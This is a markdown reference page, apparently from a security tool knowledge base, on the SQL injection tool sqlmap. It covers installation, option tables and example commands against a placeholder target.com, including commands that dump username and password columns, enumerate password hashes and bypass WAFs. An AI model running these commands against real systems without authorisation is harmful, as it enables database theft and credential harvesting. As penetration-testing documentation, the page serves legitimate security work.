---
title: "sqlmap"
category: "tool"
subcategory: "exploitation"
tags: ["sql-injection", "database", "web-exploitation", "penetration-testing", "automated-testing"]
sources:
  - type: github
    url: "https://github.com/sqlmapproject/sqlmap"
  - type: wiki
    url: "https://github.com/sqlmapproject/sqlmap/wiki"
  - type: official
    url: "https://sqlmap.org/"
last_updated: "2025-12-27"
---

# sqlmap

> Automatic SQL injection and database takeover tool.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Common Options](#common-options)
- [Database Enumeration](#database-enumeration)
- [Injection Techniques](#injection-techniques)
- [Documentation](#documentation)

## Overview

sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws. It supports a wide range of database management systems and provides capabilities for database fingerprinting, data extraction, accessing the underlying file system, and executing commands on the OS via out-of-band connections.

Key features:
- Full support for MySQL, Oracle, PostgreSQL, MSSQL, SQLite, and many more
- Multiple injection techniques (boolean, time, error, UNION, stacked, OOB)
- Database fingerprinting and enumeration
- File system access and OS command execution
- WAF detection and bypass with tamper scripts

## Installation

```bash
# Debian/Ubuntu/Kali (pre-installed on Kali)
sudo apt install sqlmap

# Arch Linux
sudo pacman -S sqlmap

# From source (recommended for latest version)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python sqlmap.py -h

# Using pipx
pipx install sqlmap
```

## Quick Start

### Basic GET Parameter Testing

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page.php?id=1"

# With increased verbosity
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id
```

### POST Request Testing

```bash
# Test POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# From Burp saved request
sqlmap -r request.txt

# Specify POST parameter
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" -p user
```

### Enumeration Examples

```bash
# Get current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables in a database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump a table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

## Common Options

| Option | Description |
|--------|-------------|
| `-u URL` | Target URL with injectable parameter |
| `-r FILE` | Load HTTP request from file |
| `--data=DATA` | POST data string |
| `-p PARAM` | Testable parameter(s) |
| `--cookie=COOKIE` | HTTP Cookie header value |
| `--level=LEVEL` | Level of tests (1-5, default 1) |
| `--risk=RISK` | Risk of tests (1-3, default 1) |
| `--dbms=DBMS` | Force specific DBMS |
| `--technique=TECH` | SQL injection techniques to use |
| `--batch` | Never ask for user input |
| `--threads=THREADS` | Concurrent HTTP requests (default 1) |
| `-v LEVEL` | Verbosity level (0-6) |
| `--proxy=PROXY` | Use proxy (e.g., http://127.0.0.1:8080) |
| `--tamper=SCRIPT` | Use tamper script(s) for WAF bypass |
| `--random-agent` | Use random User-Agent |
| `--flush-session` | Flush session files for current target |

## Database Enumeration

| Option | Description |
|--------|-------------|
| `--current-user` | Get current database user |
| `--current-db` | Get current database name |
| `--hostname` | Get database server hostname |
| `--is-dba` | Check if user is DBA |
| `--users` | Enumerate database users |
| `--passwords` | Enumerate user password hashes |
| `--privileges` | Enumerate user privileges |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--schema` | Enumerate schema |
| `--dump` | Dump table entries |
| `--dump-all` | Dump all databases tables entries |
| `-D DB` | Specify database |
| `-T TABLE` | Specify table |
| `-C COLUMNS` | Specify columns |

## Injection Techniques

| Technique | Flag | Description |
|-----------|------|-------------|
| Boolean-based blind | `B` | Inference via true/false responses |
| Error-based | `E` | Extract data from error messages |
| UNION query-based | `U` | Append UNION SELECT statements |
| Stacked queries | `S` | Execute multiple statements |
| Time-based blind | `T` | Inference via response delays |
| Inline queries | `Q` | Nested queries |

```bash
# Use specific techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Force UNION-based with column count
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-cols=5
```

## Documentation

| File | Description |
|------|-------------|
| [techniques.md](./techniques.md) | SQL injection techniques and detection strategies |
| [advanced.md](./advanced.md) | Advanced usage, WAF bypass, OS access, and file operations |
